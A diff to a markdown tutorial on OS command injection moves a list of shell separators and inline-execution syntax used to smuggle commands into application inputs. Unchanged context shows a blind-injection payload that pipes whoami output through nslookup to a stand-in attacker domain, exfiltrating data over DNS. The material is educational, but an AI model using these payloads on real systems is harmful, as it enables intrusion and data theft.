@@ -67,6 +67,16 @@ I've got some handy payloads for both Linux and Windows in the tables below.
 | Network connections     | netstat -an      | netstat -an       |
 | Running processes        | ps -ef           | tasklist          |
 
+### Injection Techniques
+
+Use various shell metacharacters for OS command injection:
+
+- Command separators (work on both systems): `&`, `&&`, `|`, `||`
+- Unix-only separators: `;`, Newline (`\n`)
+- Inline execution (Unix-only): `` `injected command` ``, `$(injected command)`
+
+Considerations for special characters within quoted contexts in original commands.
+
 ## Blind OS Command Injection on Vulnerable Websites
 
 ### Overview
@@ -101,15 +111,7 @@ Since the command output isn't in the application's responses, traditional echo 
    - Use DNS lookups to exfiltrate command output.
    - Example: `& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &`
 
-### Injection Techniques
 
-Use various shell metacharacters for OS command injection:
-
-- Command separators (work on both systems): `&`, `&&`, `|`, `||`
-- Unix-only separators: `;`, Newline (`\n`)
-- Inline execution (Unix-only): `` `injected command` ``, `$(injected command)`
-
-Considerations for special characters within quoted contexts in original commands.
 
 ### Prevention Measures
 
